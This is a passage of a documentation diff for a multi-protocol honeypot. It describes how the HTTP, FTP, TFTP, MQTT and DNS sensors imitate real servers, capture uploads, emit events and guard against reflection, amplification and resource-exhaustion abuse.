+  (`crates/sensor-http/src/lib.rs#SESSION_MEMORY_POOL_BYTES`); a session the pool asks to let go
+  is ended at its next read, or at once while it waits for its peer (one ended in its body is
+  recorded with `body_complete: false`, unanswered). The arithmetic is in
+  [capacity planning](../operations/capacity-planning.md#http-sensor-worst-case-memory).
+- **HTTPS (optional):** when `PROPOLIS_HTTP_TLS_BIND` is set, a second implicit-TLS listener in the
+  same process serves the same nginx persona and writes the same `events.jsonl`
+  (`crates/sensor-http/src/lib.rs#start_test_server_tls`). No client certificate is requested.
+  The handshake is cut at the read timeout; a failed or stalled handshake, including plaintext sent
+  to the TLS port, is dropped with a debug log and emits no event. Every event from a TLS session,
+  the connection event and each request event, carries `"tls": true`; the key is absent, not false,
+  on the plain listener (`crates/sensor-http/src/handler.rs#connection_event`). After each response the
+  handler flushes and shuts the stream down, which sends `close_notify` over TLS as nginx does.
+  Fail-closed: the sensor refuses to start (exit 1, before any bind) on a half-configured or
+  unusable cert and key pair, and the key must be mode `0600`; an OS bind failure of the TLS
+  listener stops the plain listener and exits 1. Cert and key without `PROPOLIS_HTTP_TLS_BIND` load
+  and validate, start no TLS listener, and log one warning. Rules and variables are in
+  [environment-variables.md](environment-variables.md); the operator view is
+  [../operations/networking-tls.md](../operations/networking-tls.md#sensor-tls-attacker-facing-listeners).
+- **Capture:** no login, no spool. **The POST body is captured only as a truncated
+  preview in metadata**, with its credentials redacted, never stored as a file.
+- **Emits:** `honeypot_connection`, `honeypot_command_exec`.
+
+### sensor-ftp
+
+Impersonates **vsFTPd 3.0.5** (conventional port 21).
+
+- **Behavior** (`handler.rs`): banner `220 (vsFTPd 3.0.5)`. Verbs
+  (case-insensitive, including the PASV/EPSV and LIST/NLST distinctions: lowercase `pasv`
+  gets the 227 reply and lowercase `nlst` the bare-names listing,
+  `crates/sensor-ftp/src/handler.rs#handle_connection`): USER→331, PASS→login event + 230 (password
+  dropped), SYST→`215 UNIX Type: L8`, FEAT, PWD/CWD, TYPE (validated), SIZE/MDTM
+  (canned `readme.txt`, 4096 bytes), REST, PASV/EPSV (opens a passive data listener
+  on the control interface), LIST/NLST (canned listing), STOR (captures upload →
+  `honeypot_malware_upload`), RETR→550, PORT/EPRT→502 (**active mode unimplemented - never dials out**), QUIT, NOOP, unknown→500.
+  A data transfer is reported the way it ended: no data connection within the idle
+  timeout → `425 Failed to establish connection.` (LIST and STOR alike); the client
+  closing the data connection → `226`; a STOR whose data connection goes quiet or
+  fails part way → `426 Failure reading network stream.` with the fragment still
+  captured and `complete: false` in the event; a STOR the sensor stops reading at the
+  drain cap → `451 Failure writing to local file.`.
+- **Passive-data hijack defense** (`data_peer_matches`, `crates/sensor-ftp/src/handler.rs#data_peer_matches`, `crates/sensor-ftp/src/handler.rs#handle_connection`): a
+  passive data connection whose source IP differs from the control connection's is
+  refused with `425 Security: bad IP connecting.`, preventing off-path attribution
+  poisoning (historical fix, commits `94a62ae1`, `016721e1`).
+- **Caps:** `MAX_STOR_BODY = 10_000_000` (a larger STOR keeps the prefix, drains up
+  to `MAX_STOR_DRAIN` more to measure it, and emits `truncated`/`wire_size` - see
+  [events-and-signals](events-and-signals.md#sampleref)), login
+  sanitized cap 255.
+- **Spool:** 10&nbsp;MB / 100&nbsp;MB, hand-off queue 64 (`crates/sensor-ftp/src/lib.rs#SPOOL_MAX_FILE_SIZE`, `crates/sensor-ftp/src/lib.rs#SPOOL_GLOBAL_BUDGET`, `crates/sensor-ftp/src/lib.rs#CAPTURE_QUEUE_SIZE`, `crates/sensor-ftp/src/lib.rs#start_test_server`).
+- **Bounds:** common defaults, `max_concurrent` 256.
+- **Parked control channel:** the handler does not read the control socket while a LIST or STOR
+  waits for its data connection or a STOR receives, nor while it writes a reply, so what the
+  client sends meanwhile waits in the kernel, charged to the unit's cgroup and outside the capture
+  budget. Each accepted control socket, plain or implicit TLS, has its receive and send buffers
+  fixed at 16 KiB, which Linux stores as 32 KiB a direction, before the banner
+  (`crates/sensor-ftp/src/handler.rs#CONTROL_SOCKET_BUFFER_BYTES`,
+  `crates/sensor-framework/src/listener.rs#clamp_socket_buffers`); a socket that cannot be
+  clamped is closed. Every reply write, the listing sent on a data connection and the final
+  shutdown are bounded by the idle timeout, and a reply that is not written in time ends the
+  session (`crates/sensor-ftp/src/handler.rs#write_line`): a client that never reads its replies
+  used to hold its connection slot until `max_duration`. Data connections are not clamped; the
+  sensor reads a STOR as fast as it arrives.
+- **FTPS and AUTH TLS (optional):** `PROPOLIS_FTP_TLS_CERT` and `PROPOLIS_FTP_TLS_KEY` together
+  enable AUTH TLS on the plain listener (21); `PROPOLIS_FTP_TLS_BIND` adds an implicit-TLS (FTPS,
+  990) listener that needs the pair, where the handshake comes before the banner. Both run in one
+  process, write one `events.jsonl` and share one capture hand-off and capture memory budget
+  (`crates/sensor-ftp/src/lib.rs#start_listeners`); 990 exists only when its bind is set. No
+  client certificate is requested. Rules, in the order the handler checks them
+  (`crates/sensor-ftp/src/handler.rs#handle_connection`):
+  - With no pair configured, AUTH, PBSZ and PROT get the unchanged `500 Unknown command.`, and
+    FEAT omits `AUTH SSL`, `AUTH TLS`, `PBSZ` and `PROT`. With the pair, FEAT lists them.
+  - AUTH inside TLS (implicit, or after an upgrade) gets `503 Bad sequence of commands.`. On a
+    plain session `AUTH TLS`, `AUTH TLS-C`, `AUTH SSL` and `AUTH TLS-P` are accepted (the mechanism
+    is case-insensitive); any other mechanism gets `504 Unknown AUTH type.`.
+  - Bytes the client sent behind the AUTH line (already buffered when it is read) are refused
+    before any `234`: one `honeypot_command_exec` event with `command` `AUTH`, `starttls_refused`
+    `pipelined_plaintext` and `pipelined_bytes` (the count; the injected bytes are never captured
+    or interpreted), then `504 Pipelined commands after AUTH TLS refused.`, a stream shutdown and
+    the end of the session. The event is plaintext-phase and carries no `"tls"` key.
+  - Otherwise `234 Proceed with negotiation.`, then the handshake bounded by the read timeout
+    (`crates/sensor-framework/src/tls.rs#upgrade_buffered`). A failed handshake ends the session
+    with no plaintext fallback. The upgrade then resets the session as REIN would: the username,
+    the login state, PBSZ, PROT and any open passive listener are discarded, so a USER sent in
+    cleartext does not carry into the protected session and the client must log in again; the
+    per-connection captured-byte count is kept.
+  - PBSZ is accepted only inside TLS and answers `200 PBSZ set to 0.` whatever the argument;
+    on a plain control channel it gets `503 Bad sequence of commands.`. PROT needs TLS and a
+    prior PBSZ, otherwise `503 Bad sequence of commands.`; then `PROT C` gets `200 PROT now Clear.`,
+    `PROT P` gets `200 PROT now Private.`, `PROT S` and `PROT E` get `536 PROT not supported.`
+    and anything else `504 Bad PROT command.`.
+  - After `PROT P` the passive data connection is wrapped in TLS, but only after the data peer
+    passed the same source-IP check as a plaintext transfer (`data_peer_matches`), so an off-path
+    connector never reaches the handshake. The data handshake is bounded by the read timeout and a
+    failed or stalled one gets `425 Failed to establish connection.`. LIST and NLST send the
+    listing and then close the data stream (`close_notify` on TLS). STOR over `PROT P` is captured
+    and spooled exactly like plaintext (same caps, same `honeypot_malware_upload` event), and a
+    data connection closed without a `close_notify` counts as the end of the file, as vsftpd
+    tolerates it (`crates/sensor-ftp/src/handler.rs#protect_data`).
+  - Connection, login and upload events from a session whose **control channel** is TLS carry
+    `"tls": true`; the key is absent, not false, on plain sessions
+    (`crates/sensor-ftp/src/handler.rs#tag_tls`). Data-channel protection (`PROT`) does not
+    change the tag, and the connection event of a plain session that later upgrades stays
+    untagged. Passwords are never captured, TLS or not. QUIT sends `221` then a stream shutdown
+    (`close_notify` on TLS).
+  - An implicit handshake that fails or stalls is dropped with a debug log and emits no event.
+  - Fail-closed: the sensor refuses to start (exit 1, before any bind) on a half-configured or
+    unusable pair, a TLS bind without a pair, or an unparseable TLS bind, and the key must be
+    mode `0600`; an OS bind failure on any listener stops the others and exits 1. A pair with no
+    TLS bind is not an error: it enables AUTH TLS and opens no 990 listener. Variables and the
+    full rules are in [environment-variables.md](environment-variables.md); the operator view is
+    [../operations/networking-tls.md](../operations/networking-tls.md#sensor-tls-attacker-facing-listeners).
+- **Emits:** `honeypot_connection`, `honeypot_login_attempt`,
+  `honeypot_malware_upload`, and `honeypot_command_exec` (only the pipelined-AUTH-TLS refusal).
+
+### sensor-tftp
+
+A TFTP (RFC 1350) honeypot on UDP, conventional port 69. It is one of two sensors that
+answer over UDP, so its reply surface is bounded in code and **it is off until an
+operator sets `PROPOLIS_TFTP_BIND`**: with no bind it logs the error, exits 1 and binds
+nothing (`crates/sensor-tftp/src/main.rs#load_config`).
+
+- **Sockets.** A request socket on the configured bind only receives. Each valid RRQ or
+  WRQ moves to a fresh ephemeral socket bound on the same local IP, as the RFC specifies
+  (`crates/sensor-tftp/src/guarded.rs#Transfer`). Malformed datagrams and stray
+  DATA/ACK/ERROR packets on the request socket are dropped with no reply and no event
+  (`crates/sensor-tftp/src/handler.rs#classify`).
+- **Reads are never served.** An RRQ in a valid mode gets one ERROR 1 "File not found"
+  (at most 19 bytes), then silence. An unsupported mode, and any WRQ in `mail` or an
+  unknown mode, gets ERROR 4. No DATA packet can be built: the protocol module has no
+  DATA builder (`crates/sensor-tftp/src/protocol.rs#error`).
+- **Writes are acknowledged and captured.** A WRQ in `netascii` or `octet` mode gets
+  ACK 0, then lock-step ACKs for each in-order DATA block (fixed 512-byte blocks, no
+  option negotiation). A duplicate of the previous block is re-ACKed and not stored
+  again. Out-of-order blocks, block 0 and stray packets get no reply. The transfer ends
+  on the first short block (complete), a peer ERROR, the body cap (ERROR 3), the idle
+  timeout, the packet cap, or `max_duration`; whatever arrived is captured either way,
+  with `complete: false` unless the final short block was received
+  (`crates/sensor-tftp/src/handler.rs#UploadCapture`).
+- **Anti-amplification.** Every send goes through one `send_to`, behind a byte budget
+  that refuses any packet which would take bytes sent past bytes received from the
+  peer, the request datagram included (`crates/sensor-tftp/src/guarded.rs#ByteBudget`).
+  There is no retransmission, because that would be a send with nothing new received.
+  A spoofed request therefore reflects strictly fewer bytes than the spoofer sent: the
+  reply to an 8-byte request is at most 8 bytes, to a 4-byte request none.
+- **Source pinning.** The transfer socket sends only to the exact (ip, port) the
+  request came from and drops any packet from another source without counting it or
+  resetting the idle clock.
+- **Source check.** A request from an unspecified, broadcast or multicast address (IPv4-mapped
+  IPv6 judged as the IPv4 it maps) or from a source port in
+  `crates/sensor-framework/src/reply_source.rs#REFLECTIVE_SOURCE_PORTS` (0, echo 7, daytime 13,
+  qotd 17, chargen 19, time 37) gets no transfer socket and no packet at all, not even the first
+  ERROR or ACK 0. It is still recorded, with a `suppress_reason` of `unroutable_source` or
+  `reflective_source_port` (`crates/sensor-tftp/src/handler.rs#Sensor::handle_request`). The
+  check is the one `sensor-dns` uses
+  (`crates/sensor-framework/src/reply_source.rs#check_reply_source`), and the transfer's send
+  re-runs it before the byte budget (`crates/sensor-tftp/src/guarded.rs#Transfer::send`).
+- **Rate limit** (`crates/sensor-framework/src/rate_limit.rs#ReplyRateLimiter`, wired in
+  `crates/sensor-tftp/src/lib.rs#serve`). The byte budget stops amplification, not reflection
+  itself: without a rate limit one spoofer can make the sensor send a victim one ERROR per
+  request at line rate. Every datagram on the request socket, before it is parsed, takes a token
+  from its source network's bucket (the IPv4 /24, IPv4-mapped IPv6 included, or the IPv6 /56) and
+  from a global bucket, with the same defaults as `sensor-dns`: 5 per second with a burst of 10
+  per network and 1000 per second with a burst of 2000 in total (`PROPOLIS_TFTP_REPLY_*`, see
+  [environment-variables.md](environment-variables.md)). A datagram over either budget gets no
+  reply and no event of its own; it is counted in its network's summary and one `rate_limited`
+  event per network is written when its 10-second window ends (see Emits), with the same tables,
+  eviction, overflow summary and 2-second shutdown flush as `sensor-dns`. Malformed datagrams are
+  charged too, so a junk flood is summarized rather than invisible. The DATA, ACK and ERROR
+  packets of a running transfer arrive on its own ephemeral socket and are not charged: the
+  transfer is already pinned to one peer and answers only within that peer's byte budget.
+- **Bounds.** The rate limit above; `max_concurrent` permits and the per-source admission cap (a
+  request past either is dropped unanswered), per-transfer read/idle timeout, `max_duration`
+  (dropping the transfer keeps what arrived), a packet cap derived from the body cap, and a
+  retained-body cap of `PROPOLIS_TFTP_MAX_CAPTURED_BYTES` (default 1_000_000, at most
+  `MAX_BODY_HARD_CAP` = 10_000_000, `crates/sensor-tftp/src/handler.rs#MAX_BODY_HARD_CAP`).
+  A WRQ that never delivers a byte is recorded only as a probe, not as an empty upload. A zero or
+  unparseable bound or rate aborts startup.
+- **Spool:** 10&nbsp;MB / 100&nbsp;MB, hand-off queue 64
+  (`crates/sensor-tftp/src/lib.rs#SPOOL_GLOBAL_BUDGET`, `crates/sensor-tftp/src/lib.rs#CAPTURE_QUEUE_SIZE`,
+  `crates/sensor-tftp/src/lib.rs#start_test_server`). The body is never executed,
+  served or interpreted; `netascii` uploads are stored as the raw bytes received.
+- **Emits:** `honeypot_connection` per RRQ/WRQ the sensor handles (protocol `udp`, metadata
+  `protocol_label`, `filename`, `mode`, `direction` of `rrq` or `wrq`, all sanitized, and
+  `suppress_reason` when the source check refused it) and `honeypot_malware_upload` (protocol
+  `udp`, standard upload metadata). Both share one session id per transfer. A request dropped by
+  the per-source cap or the `max_concurrent` pool gets no event, only a `warn` log line at
+  power-of-two totals. Rate-limited datagrams produce one `honeypot_connection` (protocol `udp`,
+  `query_status` `rate_limited`) per source network per window, the same event `sensor-dns`
+  writes (`crates/sensor-framework/src/rate_limit.rs#rate_limited_event`): `source_ip` is the
+  first address seen from the network in the window, and the metadata carries `protocol_label`
+  `tftp`, `transport` `udp`, `source_prefix` (CIDR, or `overflow`), `suppressed_count`,
+  `suppressed_bytes` (each datagram counted up to the 1024-byte receive buffer,
+  `crates/sensor-tftp/src/handler.rs#RECV_BUFFER`), `per_source_limited`, `global_limited`,
+  `first_seen`, `last_seen`, `window_secs`, up to 8 sanitized `samples` of `"<rrq|wrq>
+  <filename>"` (or `malformed`), and `distinct_sources` (counted up to 32, with
+  `distinct_sources_capped` set beyond that). All TFTP events are `authenticated=false` (TFTP has
+  no authentication). `wan_ip` resolves against the bind address, so a wildcard bind has the same
+  attribution limit as the catch-all's UDP path.
+
+### sensor-mqtt
+
+An MQTT honeypot on TCP, conventional port 1883. It records metadata for every PUBLISH and
+additionally spools a PUBLISH payload that passes the shared `looks_binary` gate
+(`crates/sensor-mqtt/src/handler.rs#on_publish`). It is **off until an
+operator sets `PROPOLIS_MQTT_BIND`**: with no bind it logs the error, exits 1 and binds
+nothing (`crates/sensor-mqtt/src/main.rs#load_config`). It speaks MQTT 3.1
+(`MQIsdp` level 3), 3.1.1 (`MQTT` level 4) and 5.0 (`MQTT` level 5), accepts any credential
+on every connection (the deliberate low-interaction choice: it is what lets the
+post-CONNECT SUBSCRIBE and PUBLISH recon through, and every CONNECT is logged, so a
+brute-force run across connections is captured), and serves nothing: no message is ever
+delivered to a subscriber, retained, or forwarded, no outbound socket is opened, and nothing
+is executed. A binary PUBLISH payload is quarantined through the framework capture hand-off,
+under the process-wide capture-memory budget, and never run.
+
+- **Packets answered.** CONNECT (CONNACK accept `20 02 00 00`; for level 5
+  `20 03 00 00 00`: ack flags 0, reason `0x00`, empty properties), SUBSCRIBE (SUBACK granting
+  `min(requested, 1)` per filter, `0x80` for an invalid filter, `0x8F` in 5.0; the 5.0 SUBACK
+  is the packet id, an empty properties byte, then one reason per filter), UNSUBSCRIBE
+  (UNSUBACK; in 5.0 the packet id, an empty properties byte and a `0x00` reason per filter),
+  PUBLISH (QoS 0 silent, QoS 1 PUBACK, QoS 2 PUBREC then PUBCOMP on PUBREL; the 5.0 acks use
+  the short form with an implied success reason, which the spec allows), PINGREQ (PINGRESP),
+  and in 5.0 only AUTH (answered with AUTH reason `0x00`, no properties, and logged as a
+  `command` `AUTH` with its `reason_code` and `auth_method`). A 5.0 PUBACK, PUBREC or PUBCOMP
+  is parsed and ignored, since the sensor never sends a PUBLISH. DISCONNECT closes. Every
+  other type, a reserved fixed-header flag violation (SUBSCRIBE/UNSUBSCRIBE/PUBREL need
+  `0b0010`, the rest `0`), a second CONNECT, any packet before CONNECT, and (before 5.0)
+  AUTH, PUBACK, PUBREC or PUBCOMP close the connection without a reply
+  (`crates/sensor-mqtt/src/handler.rs#Session`).
+- **CONNECT.** The protocol name and level must pair as `MQIsdp`/3 or `MQTT`/4 or `MQTT`/5;
+  any other pair, the reserved connect-flag bit, a will-QoS or will-retain without a will,
+  will-QoS 3, or (before 5.0) a password flag without a username flag is malformed and closes
+  the connection, recorded as a malformed connection event (see below). The password is read
+  only to reach the end of the payload and is dropped; it never reaches an event or the log
+  (`crates/sensor-mqtt/src/handler.rs#parse_connect`).
+- **MQTT 5.0 properties.** A properties block is a varint byte length and then that many
+  bytes of identifier and typed value. It is parsed strictly inside its declared length with
+  checked indexing, reads at most `MAX_PROPERTIES` = 64 properties, and keeps at most
+  `MAX_LOGGED_USER_PROPERTIES` = 16 user properties (`user_property_count` counts them all)
+  (`crates/sensor-mqtt/src/handler.rs#parse_properties`). A malformed, unknown or
+  over-count property stops the block and sets `properties_parse_error` on the event; the
+  packet is not failed and the payload boundary stays exact, because the cursor lands on the
+  declared block end. Only a declared length that does not fit in the packet is malformed.
+  Session-Expiry-Interval, Receive-Maximum, Maximum-Packet-Size, Topic-Alias-Maximum,
+  Request-Response-Information, user properties and the Authentication-Method name are
+  decoded; Authentication-Data is a credential and, like the password, is read to advance
+  the parser and dropped, never stored or logged. A 5.0 PUBLISH payload is the remainder
+  after its properties block, and a Topic Alias is recorded as `topic_alias` and never
+  resolved. Levels 3 and 4 have no properties blocks.
+- **Keepalive.** After CONNECT the per-read idle wait is `min(idle_timeout, 1.5 x
+  keepalive)`; a keepalive of 0 leaves `idle_timeout` in charge, as a real broker's
+  keepalive-off does (`crates/sensor-mqtt/src/handler.rs#keepalive_idle`).
+- **Parser bounds.** The remaining-length varint is at most four bytes (a fifth continuation
+  byte closes the connection). A packet declaring more than `MAX_PACKET_BYTES` = 262144 bytes
+  is refused on the declaration alone, before any body is read
+  (`crates/sensor-mqtt/src/handler.rs#MAX_PACKET_BYTES`). The body is read up to the declared
+  length in 8 KiB steps into a buffer that at most doubles and never grows past the declaration,
+  so memory grows with bytes actually received, never with what is merely declared
+  (`crates/sensor-mqtt/src/handler.rs#read_body`). A connection ends after `MAX_PACKETS` = 1024
+  packets (`crates/sensor-mqtt/src/handler.rs#MAX_PACKETS`), at `max_captured_bytes` total bytes
+  read, on the first-byte `read_timeout` and per-read `idle_timeout`, or at `max_duration`.
+- **Session memory.** The binary installs the session accounting allocator and runs each
+  connection, plain or TLS, in its own accounted scope, as the shell sensors do: a body still
+  arriving is the session's heap, charged to a pool of 30% of `MemoryMax` shared by every
+  session of both listeners. With both listeners the per-session floor is 157,286 bytes, so while
+  the pool is full a PUBLISH body past 128 KiB (131,072 bytes; the buffer then doubles to
+  262,144) is not captured: its session is ended with `end_reason` `memory_limit`. A session
+  the pool cannot hold is ended, whether it is reading a
+  body or waiting for the next packet, and a connection that cannot get a slot is closed before
+  anything is answered. A PUBLISH declaring 256 KiB and sent most of the way used to hold that
+  much heap until the idle timeout; hundreds of them on the TLS listener were half of what
+  OOM-killed the unit. See
+  [capacity planning](../operations/capacity-planning.md#session-memory-sensor-ssh-sensor-telnet-sensor-adb-sensor-mqtt).
+- **Replies to a peer that does not read.** The handler does not read while it writes a reply,
+  and a SUBACK carries one byte per filter, so SUBSCRIBEs a peer never reads block the write
+  while what the peer sends next waits in the kernel. Each accepted socket has its receive and
+  send buffers fixed at 16 KiB, stored by Linux as 32 KiB a direction, before the first read
+  (`crates/sensor-mqtt/src/handler.rs#SOCKET_BUFFER_BYTES`); a socket that cannot be clamped is
+  closed. A reply, and the closing shutdown, get `REPLY_WRITE_TIMEOUT` = 5 s (never more than
+  the idle timeout) before the session ends (`crates/sensor-mqtt/src/handler.rs#REPLY_WRITE_TIMEOUT`),
+  and the packet's body is dropped before the write.
+- **Emits:** `honeypot_connection` at accept; `honeypot_login_attempt`
+  (`authenticated=true`; `client_id`, `username` (empty when anonymous), `protocol_level`,
+  `keepalive`, `clean_session`, and `will_topic` and `will_payload_len` when a will is set;
+  for level 5 also `auth_method`, `session_expiry`, `receive_max`, `max_packet_size`,
+  `topic_alias_max`, `request_response_info` and `user_properties` (name and value pairs,
+  first 16) when present; never the password or the authentication data);
+  `honeypot_command_exec` with `command` `SUBSCRIBE` (`topics` and `qos`
+  for the first 32 filters, `topic_count` for all) or `PUBLISH` (`topic`, `qos`, `retain`,
+  `dup`, `payload_len`, a `payload_preview` of at most 256 bytes as sanitized text or as hex
+  when the prefix has non-UTF-8 or control bytes (`payload_preview_encoding` says which), and
+  `payload_sha256` over the whole payload), or `AUTH` (5.0 only). Every attacker string is
+  lossy-decoded, passed through `sanitize_value` and capped at 255 characters; no event
+  carries a sample except the one below.
+- **Binary PUBLISH capture.** When a PUBLISH payload passes `looks_binary`, the metadata
+  event above is still emitted and the payload is also spooled, emitting a
+  `honeypot_malware_upload` event (`crates/sensor-mqtt/src/handler.rs#capture_job`) whose
+  metadata carries `topic`, `qos`, `retain`, `dup`, `capture_reason` =
+  `binary_publish_payload` and, in 5.0, `topic_alias`. The sample is named after the
+  sanitized, bounded topic (or `mqtt-publish-<session id>` when the topic is empty). A text
+  or control payload stays metadata-only.
+- **Malformed first packet.** A connection that sent bytes but whose first packet was
+  malformed or not a CONNECT (a bad remaining length, an oversize declaration, a truncated or
+  invalid CONNECT, a wrong fixed-header flag, a non-CONNECT first packet) emits a second
+  `honeypot_connection` event with `malformed=true`, a `reason`, `bytes_seen`, and
+  `first_bytes_hex`, at most 32 wire bytes as hex, never raw text
+  (`crates/sensor-mqtt/src/handler.rs#malformed_observation`). A connection that sent
+  nothing, and a malformed packet after a successful CONNECT, add no such event.
+- **Session end.** Every connection ends with one `honeypot_session_end` event
+  (`authenticated=false`; `packets`, `publishes`, `subscribes`, `bytes_in`, `duration_ms`
+  and the `client_id` when a CONNECT was seen, plus `end_reason` `memory_limit` when the session
+  memory pool ended it) (`crates/sensor-mqtt/src/handler.rs#Session::end_observation`). It is not emitted when
+  `max_duration` cancels the handler, because the listener drops the handler future.
+- **Bounds:** common defaults, `max_concurrent` 256, per-source admission cap. Strict
+  parsing: a zero or unparseable bound aborts startup. Only a binary PUBLISH payload is spooled
+  (see above); a text payload is never spooled.
+- **MQTT over TLS (optional):** when `PROPOLIS_MQTT_TLS_BIND` is set, a second implicit-TLS
+  (MQTTS) listener in the same process serves the same persona and writes the same
+  `events.jsonl` (`crates/sensor-mqtt/src/lib.rs#start_tls_listener`). MQTT 3.1, 3.1.1 and 5.0
+  all work over it. No STARTTLS exists and no client certificate is requested. The handshake is
+  cut at the read timeout; a failed or stalled handshake, including plaintext sent to the TLS
+  port, is dropped with a debug log and emits no event. Every event from a TLS session, the
+  connection event, the login attempt, each command event, the malformed-first-packet event, the
+  `honeypot_malware_upload` event and the session-end event, carries `"tls": true`; the key is
+  absent, not false, on the plain listener (`crates/sensor-mqtt/src/handler.rs#stamp_tls`).
+  Binary-PUBLISH spooling, the capture-memory budget and the shutdown drain apply identically
+  over TLS: the plain and TLS listeners share one capture hand-off, one budget and one drain
+  (`crates/sensor-mqtt/src/lib.rs#new_capture_handoff`). Replies are flushed, and every session
+  ends with a stream shutdown, which sends `close_notify` on TLS and a FIN on a plain
+  connection (the plain listener now closes its side cleanly too; no new event or reply
+  results). No refusal replies are added. Fail-closed: the sensor refuses to start (exit 1,
+  before any bind) on a half-configured or unusable cert and key pair, and the key must be mode
+  `0600`; an OS bind failure of the TLS listener stops the plain listener and exits 1. Cert and
+  key without `PROPOLIS_MQTT_TLS_BIND` load and validate, start no TLS listener, and log one
+  warning. Rules and variables are in [environment-variables.md](environment-variables.md); the
+  operator view is
+  [../operations/networking-tls.md](../operations/networking-tls.md#sensor-tls-attacker-facing-listeners).
+
+### sensor-dns
+
+A DNS honeypot with three surfaces: UDP and TCP on the one `PROPOLIS_DNS_BIND` address
+(conventional port 53) and, optionally, DNS over TLS (RFC 7858, conventional port 853). It is
+**off until an operator sets `PROPOLIS_DNS_BIND`**: with no bind it logs the error, exits 1 and
+binds nothing (`crates/sensor-dns/src/main.rs#load_config`). UDP and TCP are bound together
+or not at all: UDP is bound first but not served until TCP binds on the same port, and if either
+bind fails the sensor exits 1 with nothing left listening
+(`crates/sensor-dns/src/lib.rs#start_test_server`). It serves no records: every query that parses
+gets the same REFUSED reply, and it never resolves, forwards, or looks anything up.
+
+- **Parsing** (`crates/sensor-dns/src/protocol.rs#parse_query`). Checks run in a fixed order and
+  the first failure rejects the message: shorter than the 12-byte header (`short_header`), QR set
+  (`response_inbound`: a response arriving inbound is never answered, so two DNS honeypots cannot
+  loop), a non-zero opcode such as NOTIFY or UPDATE (`opcode`), QDCOUNT other than 1
+  (`qdcount`), then the question: a compression pointer (`compression_pointer`; no pointer is
+  ever followed), an extended or reserved label type (`bad_label`), a name over 255 wire bytes
+  (`name_too_long`), or a name, type or class running past the end (`truncated_question`).
+  Last, any answer record, or any authority record (`answer_or_authority_present`), except that
+  an IXFR over TCP may carry the one SOA authority record RFC 1995 requires: exactly one
+  authority record, of type SOA. Any other authority type is `answer_or_authority_present`, and
+  an authority record that does not parse is `malformed_authority`. The EDNS scan never
+  rejects: it walks at most 8 additional records for an OPT, skipping owner-name pointers
+  without following them and holding each owner name to 255 wire bytes, root byte included, and
+  records two OPT records, a non-root OPT owner, an unparseable additional record or an option
+  running past its data as `edns_malformed`. At most 16 option codes are kept; option data is
+  never stored (an ECS option carries a third party's subnet). The qname is rendered in RFC 1035
+  master-file form, so every byte survives as printable ASCII (`\.`, `\\`, `\DDD`).
+- **The one reply** (`crates/sensor-dns/src/protocol.rs#refused_reply`): the query's own header
+  rewritten in place (ID kept, QR set, opcode 0, AA/TC/RA/Z/AD clear, RD and CD copied, RCODE 5
+  REFUSED, QDCOUNT 1, other counts 0) followed by the first question copied verbatim, nothing
+  appended. Its length is the end of the question, never more than the query, so on UDP **bytes
+  sent never exceed bytes received**. AXFR and IXFR get the same REFUSED. No OPT record is
+  returned even when the query had one; that is a known fingerprint, since a real EDNS responder
+  returns an OPT [inferred].
+- **UDP send guard.** Before the crate's single `send_to`
+  (`crates/sensor-dns/src/guarded.rs#ReplySocket`), `crates/sensor-dns/src/guarded.rs#reply_gate`
+  refuses to answer an unspecified, broadcast or multicast source, a source port in
+  `crates/sensor-framework/src/reply_source.rs#REFLECTIVE_SOURCE_PORTS` (0, echo 7, daytime 13,
+  qotd 17, chargen 19, time 37), both through
+  `crates/sensor-framework/src/reply_source.rs#check_reply_source`, which `sensor-tftp` shares,
+  and any reply a byte budget
+  seeded with the query length would refuse.
+  Such a query is still recorded, with `query_status` `suppressed` and a `suppress_reason`
+  (`reflective_source_port`, `unroutable_source`, `byte_budget`). A rejected datagram gets no
+  reply; a datagram shorter than a header gets neither a reply nor an event.
+  `crates/sensor-dns/tests/integration.rs#never_amplifies_static_check` keeps the send site and
+  the TCP write site to one each.
+- **UDP rate limit** (`crates/sensor-framework/src/rate_limit.rs#ReplyRateLimiter`). Bounding
+  each reply's size stops amplification, not reflection itself: without a rate limit one
+  spoofer can make the sensor send a victim one reply per query at line rate. Every UDP datagram
+  of at least a header first takes a token from its source network's bucket (the IPv4 /24,
+  IPv4-mapped IPv6 included, or the IPv6 /56) and from a global bucket. The defaults are 5 per
+  second with a burst of 10 per network and 1000 per second with a burst of 2000 in total
+  (`PROPOLIS_DNS_REPLY_*`, see
+  [environment-variables.md](environment-variables.md)). The first datagrams of a burst are
+  handled, answered and logged as usual. A datagram over either budget gets no reply (there is
+  no truncated "slip" reply: a honeypot has no legitimate client to steer to TCP) and no event of
+  its own. It is counted instead in its network's summary in
+  `crates/sensor-framework/src/rate_limit.rs#FloodLedger`, and one `rate_limited` event per
+  network is written when its 10-second window ends (see Emits), so a flood costs the log at most
+  one event per network per window. The network table holds 4096 networks and the summary table
+  1024, both allocated once: a full network table evicts the least recently seen of four sampled
+  entries, and a network arriving at a full summary table is counted in one `overflow` summary.
+  At shutdown the summaries still accumulating are written, bounded by those tables and a
+  2-second timeout. TCP and DoT are not rate limited: the handshake proves the source, so they
+  cannot be aimed at a third party.
+- **TCP and DNS over TLS** (`crates/sensor-dns/src/stream.rs#handle_connection`). RFC 1035
+  length-prefixed framing; pipelined queries are answered in order. A length prefix under 12
+  is rejected as `short_header` and one over
+  `crates/sensor-dns/src/stream.rs#MAX_TCP_MESSAGE_BYTES` (4096) as `oversize`, in both cases
+  without reading the body; either, or any rejected message, ends the connection without a
+  reply. A connection carries at most
+  `crates/sensor-dns/src/stream.rs#MAX_QUERIES_PER_CONNECTION` (64) queries and at most
+  `max_captured_bytes` bytes, each message charged its 2-byte prefix as well as its body (the
+  default 262_272 is exactly 64 maximum-size messages). A message that would pass that cap is
+  not read and is rejected as `byte_cap`; a body the peer cuts short is `truncated_body`, and one
+  that does not arrive within `read_timeout` is `body_timeout`. Each of those carries the
+  `declared_len` and ends the connection. The first message must arrive within `read_timeout`
+  and each later one within `idle_timeout`; a silent connection ends with no further event. A
+  reply must be written within `read_timeout`, so a peer that stops reading cannot hold the
+  handler. Every exit path of the handler shuts the stream down, so a DoT session it ends
+  finishes with `close_notify`. The exception is `max_duration`: the listener drops the handler
+  wherever it is waiting, which closes the connection with no `close_notify` and no event. DoT
+  (`crates/sensor-dns/src/lib.rs#start_test_server_tls`) runs the same handler behind an
+  implicit-TLS handshake cut at the read timeout; a failed or stalled handshake, plaintext
+  included, is dropped with no event. No ALPN is advertised.
+- **Emits:** UDP: one `honeypot_connection` (protocol `udp`) per datagram the sensor handles,
+  with its own session id. Not every datagram is handled one by one: one over the rate limit is
+  counted in a summary instead, and one dropped by the per-source admission cap or the
